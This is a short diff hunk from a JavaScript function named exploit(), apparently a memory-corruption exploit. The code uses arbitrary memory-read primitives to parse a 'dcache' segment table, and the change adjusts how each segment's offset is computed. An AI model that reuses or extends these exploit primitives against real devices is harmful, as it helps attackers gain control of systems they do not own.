@@ -556,7 +556,7 @@ function exploit(){
         var dcache_segdata = memory.copyfrom(Add(dcache_base, memory.u32(Add(dcache_base, new Int64('0x10')))), 0, dcache_nsegs * new Int64('0x20'));
         var dcache_segs = [];
         for(var i = 0; i < dcache_nsegs; i++){
-            var off = i * new Int64('0x20');
+            var off = i * 0x20;
             var seg = {  
                 addr:     new Int64(dcache_segdata.slice(Add(off,new Int64('0x0')), Add(off,new Int64('0x8')))),
                 size:     new Int64(dcache_segdata.slice(Add(off,new Int64('0x8')), Add(off,new Int64('0x10')))),
